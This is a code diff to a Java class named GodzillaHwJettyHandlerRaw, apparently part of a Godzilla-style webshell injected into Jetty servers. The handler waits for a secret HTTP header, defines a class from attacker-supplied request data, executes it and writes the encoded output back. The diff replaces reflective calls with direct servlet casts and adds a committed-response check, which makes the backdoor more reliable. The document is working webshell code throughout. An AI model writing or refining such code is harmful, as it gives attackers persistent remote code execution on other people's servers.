@@ -97,7 +97,7 @@ public class GodzillaHwJettyHandlerRaw {
 
     @SuppressWarnings("all")
     private boolean run(Object request, Object response) throws Exception {
-        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+        String value = ((HttpServletRequest) request).getHeader(headerName);
         if (value == null || !value.contains(headerValue)) {
             return false;
         }
@@ -106,7 +106,10 @@ public class GodzillaHwJettyHandlerRaw {
             payload = reflectionDefineClass(data);
             return true;
         }
-        java.io.OutputStream outputStream = (java.io.OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
+        if (((HttpServletResponse) response).isCommitted()) {
+            return true;
+        }
+        java.io.OutputStream outputStream = ((HttpServletResponse) response).getOutputStream();
         try {
             outputStream.write(x(execute(request, data), true));
         } catch (Throwable e) {
@@ -130,7 +133,7 @@ public class GodzillaHwJettyHandlerRaw {
 
     @SuppressWarnings("all")
     private static byte[] readBody(Object request) throws Exception {
-        java.io.InputStream inputStream = (java.io.InputStream) request.getClass().getMethod("getInputStream").invoke(request);
+        java.io.InputStream inputStream = ((HttpServletRequest) request).getInputStream();
         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
         byte[] buffer = new byte[8192];
         int read;
